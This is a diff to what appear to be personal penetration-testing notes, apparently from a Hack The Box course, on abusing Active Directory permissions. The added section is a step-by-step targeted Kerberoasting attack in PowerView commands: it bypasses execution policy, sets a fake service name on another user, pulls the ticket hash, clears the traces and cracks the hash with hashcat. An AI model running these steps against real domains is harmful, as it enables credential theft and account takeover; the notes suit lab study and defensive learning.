@@ -24,5 +24,23 @@ enumeration!
   PS> Set-Acl
   on linux, we can use impacket's dacledit.py
 
+we can kerberoast when we have GenericAll, GenericWrite, WriteProperty, WriteSPN or Validated-SPN over the target
+  checking our rights over a target using powerview
+    PS C:\Tools> Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
+    PS C:\Tools> Import-Module .\PowerView.ps1
+    PS C:\Tools> $userSID = (Get-DomainUser -Identity pedro).objectsid
+    PS C:\Tools> Get-DomainObjectAcl -Identity rita | ?{$_.SecurityIdentifier -eq $userSID}
+  setting the SPN
+    PS C:\Tools> Get-DomainUser Rita | Select serviceprincipalname
+    PS C:\Tools> Set-DomainObject -Identity rita -Set @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose
+  getting the hash
+    PS C:\Tools> $User = Get-DomainUser Rita
+    PS C:\Tools> $User | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash
+  clearing the SPN
+    PS C:\Tools> Set-DomainObject -Identity Rita -Clear serviceprincipalname -Verbose
+  crack the hash
+    kristab@htb[/htb]$ hashcat -m 13100 /tmp/rita.hash /usr/share/wordlists/rockyou.txt --force
+NOTE: for linux we can use https://github.com/ShutdownRepo/targetedKerberoast
+
 resources:
 https://www.thehacker.recipes/ad/movement/dacl#abuse
